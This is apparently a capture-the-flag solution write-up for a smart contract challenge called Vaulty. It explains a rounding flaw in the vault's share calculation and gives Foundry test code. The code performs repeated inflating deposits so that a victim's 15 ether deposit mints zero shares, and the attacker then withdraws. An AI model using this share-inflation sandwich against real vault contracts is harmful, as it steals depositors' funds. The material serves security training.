# romeroadrian-vaulty - Solution

## Find the vulnerability

In this challenge we need to sandwich Alice that is depositing 15 ether into Vaulty contract. It seems we need to do something like a donation attack.

Looking at `deposit` function we see that it divides by `INITIAL_RATE` and assets to calculate shares:

```python
if supply == 0:
    assert msg.value >= INITIAL_RATE
    shares = unsafe_div(msg.value, INITIAL_RATE)
else:
    shares = unsafe_div(msg.value * supply, assets)
```

Bingo! We can take advantage of division rouding error to make multiple donations, that increase with each interaction, leaving shares at 1.

When Alice deposit to Vaulty she will get 0 shares because assets will be > 15 ether and supply = 1.

## Exploit the contract

```solidity
vm.startPrank(player);
/*//////////////////////////////////////
//     Write your solution here       //
//////////////////////////////////////*/
vaulty.deposit{value: 2 * 10 ** 9 - 1}();
for (uint256 i = 1;; i++) {
    uint256 depositAmount = 2 ** i * 10 ** 9 - 2 ** i;
    if (address(player).balance < depositAmount) {
        break;
    }
    vaulty.deposit{value: depositAmount}();
}
/*//////////////////////////////////////
//         Do not touch this          //
//////////////////////////////////////*/
vm.stopPrank();

vm.startPrank(alice);
vaulty.deposit{value: 15 ether}();
vm.stopPrank();

vm.startPrank(player);
/*//////////////////////////////////////
//     Write your solution here       //
//////////////////////////////////////*/
vaulty.withdraw(1);
```
